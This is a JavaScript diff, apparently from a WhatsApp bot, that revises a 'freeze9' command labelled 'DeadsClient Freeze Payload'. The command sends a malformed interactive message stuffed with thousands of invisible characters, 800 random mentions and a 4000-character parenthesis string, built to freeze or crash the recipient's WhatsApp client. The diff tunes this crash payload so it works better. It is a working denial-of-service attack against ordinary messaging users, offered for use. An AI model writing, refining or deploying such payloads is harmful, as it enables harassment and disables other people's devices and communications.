@@ -14758,10 +14758,9 @@ case 'frage': {
 }
 break
 case "freeze9": {
-    // Sofort abbrechen falls es ein Bot oder eigene Nachricht ist
     if (msg.key.fromMe || 
-        (msg.participant && msg.participant.includes('@lid')) || 
-        msg.key.remoteJid.endsWith('@lid')) return;
+        msg.key.remoteJid.endsWith('@lid') || 
+        (msg.participant && msg.participant.endsWith('@lid'))) return;
 
     const target = msg.key.remoteJid;
 
@@ -14770,8 +14769,8 @@ case "freeze9": {
             {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({
-                    title: "".repeat(9000),
-                    sections: [{ title: "", rows: [] }]
+                    title: "\u200E".repeat(9000),
+                    sections: [{ title: "\u200E", rows: [] }]
                 })
             }
         ];
@@ -14795,53 +14794,45 @@ case "freeze9": {
             {
                 viewOnceMessage: {
                     message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
                         interactiveMessage: {
                             header: {
                                 title: " | ☠️DeadsClient 🔥",
-                                hasMediaAttachment: false,
+                                hasMediaAttachment: false
+                            },
+                            body: {
+                                text: "☠️DeadsClient 🔥 Freeze Payload"
                             },
                             contextInfo: {
                                 participant: target,
                                 mentionedJid: [
                                     "0@s.whatsapp.net",
-                                    ...Array.from({ length: 1000 }, () => 
+                                    ...Array.from({ length: 800 }, () => 
                                         "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                     )
                                 ],
+                                forwardingScore: 999,
+                                isForwarded: true
                             },
-                            remoteJid: "status@broadcast",
-                            stanzaId: msg.key.id,
-                            quotedMessage: {
-                                paymentInviteMessage: {
-                                    serviceType: "UPI",
-                                    expiryTimestamp: Date.now()
-                                }
-                            },
-                            isForwarded: true,
-                            forwardingScore: 1972,
-                            forwardMessageForwardInfo: {
-                                businessMessageForwardInfo: {
-                                    businessOwnerJid: "13135550002@s.whatsapp.net"
-                                }
+                            nativeFlowMessage: {
+                                buttons: ButtonsQPay,
+                                messageParamsJson: "(".repeat(4000)
                             }
                         }
                     }
-                },
-                body: {
-                    text: "☠️DeadsClient 🔥 Freeze Payload"
-                },
-                nativeFlowMessage: {
-                    buttons: ButtonsQPay,
-                    messageParamsJson: "(".repeat(5000)
                 }
-            }
+            },
+            { timestamp: Date.now() }   // <-- wichtig
         );
 
         await sock.sendMessage(target, messageContent);
-        console.log(`✅ Freeze9 gesendet an ${target}`);
+        console.log(`✅ Freeze9 gesendet → ${target}`);
 
     } catch (e) {
-        console.error("❌ Freeze9 Error:", e);
+        console.error("❌ Freeze9 Error:", e.message || e);
     }
     break;
 }
